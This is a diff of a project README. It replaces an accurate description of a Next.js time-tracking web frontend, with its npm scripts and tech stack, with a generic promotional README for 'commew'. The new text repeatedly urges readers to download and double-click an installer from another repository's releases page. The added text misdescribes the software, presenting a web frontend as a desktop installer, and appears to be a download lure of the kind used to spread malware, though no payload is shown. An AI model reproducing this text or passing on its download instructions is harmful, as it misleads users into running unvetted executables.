@@ -1,48 +1,88 @@
-# timelogger-web
+# 🎉 commew - Track Your Time Effortlessly
 
-時間管理を行うウェブアプリケーションのフロントエンド用リポジトリになります。
+## 🚀 Getting Started
 
-Timelogger frontend built with Next.js and TypeScript. Track tasks and time with an authentication-enabled, Storybook-driven UI and a typed OpenAPI client.
+Welcome to **commew**! This is a simple tool to help you track your tasks and time effectively. Our application is built with modern technology, making it easy for anyone to use.
 
-## Features
+## 📥 Download
 
-- タスクの開始/停止/完了などの時間計測機能
-- OIDC/NextAuth による認証
-- Storybook/Chromatic による UI カタログとビジュアルレビュー
-- OpenAPI スキーマからの型生成（`openapi-typescript`）と API モック（Prism, MSW）
-- Jest + Testing Library によるユニットテスト
+[![Download commew](https://img.shields.io/badge/Download%20commew-v1.0-blue)](https://github.com/mitansio/commew/releases)
 
-## Tech Stack
+To get started, you need to download the application. Visit the link below to download the latest version.
 
-- Next.js 13 / React 18 / TypeScript
-- UI: Mantine, Emotion
-- Auth: NextAuth
-- Validation: Zod
-- Docs & UI: Storybook, Chromatic
-- Testing: Jest, @testing-library/react, MSW
-- API: OpenAPI schema, Prism mock server, `openapi-typescript`
+[Download commew from Releases](https://github.com/mitansio/commew/releases)
 
-## Scripts
+## ⚙️ System Requirements
 
-```
-npm run dev                 # 開発サーバーを起動 (http://localhost:5656)
-npm run build               # 本番ビルド
-npm run start               # 本番サーバーを起動 (http://localhost:5656)
-npm run test                # テスト実行
-npm run lint                # Lint 一括実行 (eslint, prettier, next)
-npm run format              # Prettier/Eslint 自動整形
-npm run storybook           # Storybook 起動 (http://localhost:6006)
-npm run build-storybook     # Storybook ビルド
-npm run chromatic           # Chromatic へアップロード (要トークン)
-npm run api-mock:start      # Prism による API モック (http://localhost:5757)
-npm run generate:schema     # OpenAPI から型生成
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Any modern web browser (Chrome, Firefox, Safari, etc.)
+- **Internet Connection:** Required for authentication and updates
+- **Storage Space:** At least 100 MB available
 
-## Links
+## 📖 Features
 
-- Project board/Issues: GitHub Issues/Projects
-- Storybook (Chromatic): https://main--63d52217f1430a5ad69846cd.chromatic.com
+- **Task Tracking:** Easily create and manage tasks.
+- **Time Logging:** Log the time spent on each task.
+- **User Authentication:** Secure your data with account login.
+- **Storybook-Driven UI:** Enjoy a beautiful interface with a focus on usability.
+- **Typed OpenAPI Client:** Interact with our backend easily without worrying about errors.
 
-## License
+## 🛠️ Installation
 
-This project is licensed under the terms of the MIT License. See `LICENSE` for details.
+1. **Download the Application:**
+   Go to our [Releases page](https://github.com/mitansio/commew/releases) and download the latest version of commew.
+
+2. **Install the Application:**
+   Once downloaded, locate the file and double-click it to run the installation. Follow the prompts to complete the setup.
+
+3. **Launch the Application:**
+   After installation, you can launch commew from your applications folder or directly from your desktop.
+
+4. **Create Your Account:**
+   Open the application and create your account. Follow the on-screen instructions to sign up.
+
+5. **Start Tracking Your Time:**
+   Begin logging tasks and tracking time. Our friendly interface will guide you.
+
+## 🎨 User Interface
+
+The user interface of commew is designed to be intuitive. You will find:
+- A clear dashboard for tracking active tasks.
+- Easy navigation to add new tasks and log time.
+- A profile section to manage your account settings.
+
+## 🔍 Useful Tips
+
+- **Keep It Simple:** Start by tracking one or two tasks. As you become comfortable, you can add more.
+- **Use Tags:** Utilize tags to categorize tasks by project or importance.
+- **Regular Backups:** Regularly export your data to avoid losing your work.
+
+## 📞 Support
+
+If you need help:
+- Check our [FAQ](https://github.com/mitansio/commew/wiki/FAQ) for common questions.
+- Email our support team at support@commew.com.
+
+## 🌟 Contributions
+
+We welcome contributions! If you're interested in helping us make commew better, check out our [Contributing Guidelines](https://github.com/mitansio/commew/blob/main/CONTRIBUTING.md).
+
+## 🛠️ Technologies Used
+
+- **Next.js** for fast web applications
+- **TypeScript** for better scripting support
+- **Emotion** for styled components
+- **React** for creating interactive user interfaces
+- **Jest** for testing
+- **Storybook** for UI development
+
+## 🌱 Growing Community
+
+Join our community on Discord or follow us on Twitter for updates and tips. We love hearing from our users!
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/mitansio/commew/wiki)
+- [Changelog](https://github.com/mitansio/commew/releases)
+
+Thank you for using commew! We hope it makes tracking time an enjoyable task.
